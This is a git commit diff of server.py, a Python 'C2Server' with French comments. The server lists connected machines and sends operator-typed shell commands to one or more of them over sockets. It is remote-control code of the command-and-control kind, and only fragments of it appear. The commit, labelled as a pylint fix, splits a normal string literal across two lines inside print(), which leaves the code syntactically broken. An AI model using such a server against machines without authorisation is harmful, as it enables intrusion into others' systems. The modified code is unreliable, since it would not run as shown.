dba048e0d156be21de8c7df90040f262a4401155
Flavien Jobard-Houdusse <flavien.jobard-houdusse@infomaniak.com>
2025-10-01 09:04:24 +0200

    fixed with CI + pylint modif

--- server.py
+++ server.py
@@ -15,7 +15,7 @@ class C2Server:
         self.flag = True # flag pour les boucles while true
         self.commande = "" # initiation de la variable commande
         self.machine = 0 # initiation de la variable du numéro de la machine
-        self.liste = [] # initiation d'une machine qui comprendra les machines utilisée pour les commandes
+        self.liste = [] # initiation d'une liste qui comprendra les machines utilisées
         self.pwd = "" # chemin pour une seule machine
 
     def gestion(self, connexion, adresse):
@@ -64,9 +64,9 @@ class C2Server:
                     self.lister()
                     while self.flag:
                         try:
-                            self.machine = int(input("\nEntrez le numéro de la machine à contrôler : "))
+                            self.machine = int(input("\nEntrez le numéro de la machine : "))
                             if 1 <= self.machine <= len(self.connexions):
-                                self.flag = False # si l'input est correct, arrêt de la boucle pour demander
+                                self.flag = False # si l'input est bon, arrêt de la boucle
                             else:
                                 print("\nEntrez un n° de machine valide")
                         except:
@@ -90,17 +90,18 @@ class C2Server:
         liste.add_column("Adresse IP",justify="center", style="magenta")
         liste.add_column("Port", justify="right", style="green")
         for i in range(len(self.connexions)):
-            ip, port = self.connexions[i].getpeername() # .getpeername() -> prend l'adresse et le port
+            ip, port = self.connexions[i].getpeername() # .getpeername() -> prend l'adresse:port
             liste.add_row(str(i+1), str(ip), str(port))
         console = Console()
         console.print(liste)
 
     def echange(self,numeros):
         while self.commande != "stop" and self.commande != "exit":
-            print("\nEntrez la commande à exécuter ('stop' pour revenir au menu principal, 'exit' pour se déconnecter des machines)")
+            print("\nEntrez la commande à exécuter ('stop' pour revenir au menu principal,
+                  'exit' pour se déconnecter des machines)")
             if len(numeros) == 1:
                 self.connexions[numeros[0]].send("pwd".encode())
-                self.pwd = self.connexions[numeros[0]].recv(1024).decode().strip() # strip pour enlever le saut de ligne après le pwd
+                self.pwd = self.connexions[numeros[0]].recv(1024).decode().strip() # strip pour \n
             self.commande = input(f"{self.pwd} >>> ")
             if self.commande == "": # si on appuie sur entrée, relancer l'input
                 continue
@@ -111,10 +112,11 @@ class C2Server:
                     print(self.connexions[i].recv(1024).decode())
                     if self.commande == "exit":
                         self.connexions.pop(i) # vide la liste des machines connectées
-                        for j in range(len(numeros)): # si on tape exit, à chaque fois qu'on enlève une machine de la liste on enlève 1 partout pour pas out of range
+                        for j in range(len(numeros)): # si on tape exit, à chaque fois qu'on enlève 
+                                # une machine de la liste on enlève 1 partout pour pas out of range
                             numeros[j]-=1
             self.pwd = "" # reset du pwd
-        self.commande = "" # reset la variable après que la boucle soit terminée pour pouvoir rerentrer plus tard
+        self.commande = "" # reset la variable après la boucle pour pouvoir rerentrer plus tard
         self.liste = []
         print(" "*25,"Retour au menu...")
 
